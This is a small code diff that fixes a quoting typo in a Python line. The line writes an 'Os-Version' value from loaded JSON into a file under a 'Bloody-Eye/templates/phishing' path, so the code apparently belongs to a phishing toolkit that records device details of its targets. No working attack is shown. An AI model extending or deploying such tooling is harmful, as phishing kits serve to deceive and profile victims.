@@ -607,7 +607,7 @@ exit();""")
                 infor = json.loads(b)
                 for value in infor['dev']:
                     a = open("../Bloody-Eye/templates/phishing/info.json","w")
-                    b = a.write(value[Os-Version'])
+                    b = a.write(value['Os-Version'])
                     print("aaa")
                     b = a.write("")
                     a.close()
